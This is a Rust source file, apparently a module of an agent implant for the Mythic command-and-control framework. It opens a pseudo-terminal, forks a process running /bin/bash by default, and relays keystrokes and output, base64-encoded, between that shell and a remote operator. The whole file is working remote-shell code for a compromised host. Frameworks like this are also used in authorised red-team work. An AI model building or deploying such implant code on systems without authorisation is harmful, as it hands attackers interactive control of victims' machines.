use crate::structs::{InteractiveTaskMessage, InteractiveTaskType, Task};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use serde::Deserialize;
use std::os::fd::AsRawFd;
use std::os::unix::io::FromRawFd;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

#[derive(Deserialize)]
struct PtyArgs {
    #[serde(default = "default_program")]
    program_path: String,
}

fn default_program() -> String { "/bin/bash".to_string() }

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: PtyArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(_) => PtyArgs { program_path: default_program() },
    };

    // Open PTY
    let pty_result = nix::pty::openpty(None, None);
    let pty = match pty_result {
        Ok(p) => p,
        Err(e) => {
            response.set_error(&format!("Failed to open PTY: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    // Fork and exec
    match unsafe { nix::unistd::fork() } {
        Ok(nix::unistd::ForkResult::Child) => {
            let _ = nix::unistd::setsid();
            unsafe {
                libc::ioctl(pty.slave.as_raw_fd(), libc::TIOCSCTTY as _, 0);
            }
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 0);
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 1);
            let _ = nix::unistd::dup2(pty.slave.as_raw_fd(), 2);
            let _ = nix::unistd::close(pty.master.as_raw_fd());
            let _ = nix::unistd::close(pty.slave.as_raw_fd());

            let path = std::ffi::CString::new(args.program_path.as_bytes()).unwrap();
            let _ = nix::unistd::execvp(&path, &[&path]);
            std::process::exit(1);
        }
        Ok(nix::unistd::ForkResult::Parent { child }) => {
            let _ = nix::unistd::close(pty.slave.as_raw_fd());

            response.user_output = format!("PTY opened with PID {}", child);
            response.completed = false;
            let _ = task.job.send_responses.send(response).await;

            let master_fd = pty.master.as_raw_fd();
            let mut master = unsafe { tokio::fs::File::from_raw_fd(master_fd) };

            // Read from PTY, send to Mythic
            let output_tx = task.job.interactive_task_output_channel.clone();
            let task_id = task.data.task_id.clone();

            let read_handle = tokio::spawn({
                let task_id = task_id.clone();
                let output_tx = output_tx.clone();
                async move {
                    let mut buf = [0u8; 4096];
                    loop {
                        match master.read(&mut buf).await {
                            Ok(0) => break,
                            Ok(n) => {
                                let _ = output_tx.send(InteractiveTaskMessage {
                                    task_id: task_id.clone(),
                                    data: BASE64.encode(&buf[..n]),
                                    message_type: InteractiveTaskType::Output,
                                }).await;
                            }
                            Err(_) => break,
                        }
                    }
                }
            });

            // Write from Mythic to PTY
            let mut input_rx = task.job.interactive_task_input_channel;
            while let Some(msg) = input_rx.recv().await {
                if msg.message_type == InteractiveTaskType::Exit {
                    break;
                }
                if let Ok(data) = BASE64.decode(&msg.data) {
                    let mut master_write = unsafe { tokio::fs::File::from_raw_fd(master_fd) };
                    let _ = master_write.write_all(&data).await;
                    std::mem::forget(master_write); // Don't close fd
                }
            }

            // Cleanup
            let _ = nix::sys::signal::kill(child, nix::sys::signal::SIGTERM);
            read_handle.abort();

            let done_response = crate::structs::Response {
                task_id: task_id.clone(),
                completed: true,
                ..Default::default()
            };
            let _ = task.job.send_responses.send(done_response).await;
            let _ = task.remove_running_task.send(task_id).await;
        }
        Err(e) => {
            response.set_error(&format!("Fork failed: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        }
    }
}
